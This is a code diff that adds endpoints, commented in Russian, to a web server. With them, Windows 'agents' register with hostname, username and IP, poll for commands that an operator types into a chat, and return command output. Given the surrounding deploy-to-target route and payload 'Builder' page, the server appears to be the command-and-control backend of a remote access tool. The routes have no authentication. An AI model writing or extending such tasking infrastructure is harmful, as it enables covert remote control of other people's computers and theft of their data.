@@ -1035,6 +1035,174 @@ async def deploy_to_target(request: Request):
         logger.error(f"Error deploying agent: {str(e)}")
         return {"success": False, "error": str(e)}
 
+# Добавляем эндпоинты для регистрации и коммуникации с Windows агентами
+@app.post("/api/register")
+async def register_agent(request: Request):
+    """Эндпоинт для регистрации нового агента"""
+    try:
+        data = await request.json()
+        agent_id = data.get("agent_id")
+        system_info = data.get("system_info", {})
+        registration_time = data.get("registration_time")
+        
+        # Проверяем данные
+        if not agent_id:
+            return JSONResponse({
+                "status": "error",
+                "message": "Missing agent_id"
+            }, status_code=400)
+        
+        # Регистрируем агента
+        new_agent = {
+            "agent_id": agent_id,
+            "os": system_info.get("os", "Windows"),
+            "hostname": system_info.get("hostname", "unknown"),
+            "username": system_info.get("username", "unknown"),
+            "ip_address": system_info.get("ip_address", "0.0.0.0"),
+            "status": "active",
+            "first_seen": time.time(),
+            "last_seen": time.time(),
+            "system_info": system_info
+        }
+        
+        # Проверяем, существует ли агент уже
+        agent_exists = False
+        for i, agent in enumerate(agent_data):
+            if agent["agent_id"] == agent_id:
+                # Обновляем существующего агента
+                agent_data[i]["last_seen"] = time.time()
+                agent_data[i]["status"] = "active"
+                agent_data[i]["system_info"] = system_info
+                agent_exists = True
+                break
+        
+        # Добавляем нового агента, если не существует
+        if not agent_exists:
+            agent_data.append(new_agent)
+            # Логируем событие
+            record_event("connection", agent_id, f"Windows Agent registered: {system_info.get('hostname')}")
+        
+        return JSONResponse({
+            "status": "success",
+            "message": "Agent registered successfully"
+        })
+    except Exception as e:
+        logger.error(f"Error registering agent: {str(e)}")
+        return JSONResponse({
+            "status": "error",
+            "message": str(e)
+        }, status_code=500)
+
+@app.get("/api/agent/{agent_id}/commands")
+async def get_agent_commands(agent_id: str):
+    """Эндпоинт для получения команд для выполнения агентом"""
+    # Проверяем существование агента
+    agent = None
+    for a in agent_data:
+        if a["agent_id"] == agent_id:
+            agent = a
+            break
+    
+    if not agent:
+        return JSONResponse({
+            "status": "error",
+            "message": "Agent not found"
+        }, status_code=404)
+    
+    # Обновляем время последней активности
+    agent["last_seen"] = time.time()
+    
+    # В реальной системе здесь было бы получение команд из базы данных
+    # Сейчас используем заглушку для демонстрации функциональности
+    
+    # Проверяем, есть ли в истории чата команды для агента
+    commands = []
+    
+    if agent_id in chat_histories:
+        # Ищем последнюю команду от пользователя, которая начинается с "!"
+        for entry in reversed(chat_histories[agent_id]):
+            if entry["sender"] == "user" and entry["content"].startswith("!"):
+                commands.append({
+                    "id": str(int(time.time())),
+                    "command": entry["content"][1:],  # Убираем префикс "!"
+                    "timestamp": entry["timestamp"]
+                })
+                
+                # Добавляем только последнюю команду
+                break
+    
+    return JSONResponse({
+        "status": "success",
+        "agent_id": agent_id,
+        "commands": commands
+    })
+
+@app.post("/api/agent/{agent_id}/results")
+async def receive_command_results(agent_id: str, request: Request):
+    """Эндпоинт для получения результатов выполнения команд"""
+    try:
+        data = await request.json()
+        command_id = data.get("command_id")
+        result = data.get("result", {})
+        
+        # Проверяем существование агента
+        agent = None
+        for a in agent_data:
+            if a["agent_id"] == agent_id:
+                agent = a
+                break
+        
+        if not agent:
+            return JSONResponse({
+                "status": "error",
+                "message": "Agent not found"
+            }, status_code=404)
+        
+        # Обновляем время последней активности
+        agent["last_seen"] = time.time()
+        
+        # Форматируем результат для отображения в чате
+        result_message = f"Command ID: {command_id}\n"
+        
+        if result.get("status") == "success":
+            result_message += "Status: ✅ Success\n"
+        else:
+            result_message += "Status: ❌ Error\n"
+        
+        if "exit_code" in result:
+            result_message += f"Exit Code: {result.get('exit_code')}\n"
+        
+        if "stdout" in result and result["stdout"]:
+            result_message += f"\nOutput:\n{result.get('stdout')}\n"
+        
+        if "stderr" in result and result["stderr"]:
+            result_message += f"\nErrors:\n{result.get('stderr')}\n"
+        
+        if "message" in result:
+            result_message += f"\nMessage: {result.get('message')}\n"
+        
+        # Добавляем результат в историю чата
+        if agent_id in chat_histories:
+            chat_histories[agent_id].append({
+                "sender": "agent",
+                "content": result_message,
+                "timestamp": time.time()
+            })
+        
+        # Логируем событие
+        record_event("command_result", agent_id, f"Received result for command {command_id}")
+        
+        return JSONResponse({
+            "status": "success",
+            "message": "Result received"
+        })
+    except Exception as e:
+        logger.error(f"Error processing command result: {str(e)}")
+        return JSONResponse({
+            "status": "error",
+            "message": str(e)
+        }, status_code=500)
+
 # Создадим HTML шаблон для страницы Builder
 builder_html = """
 <!DOCTYPE html>
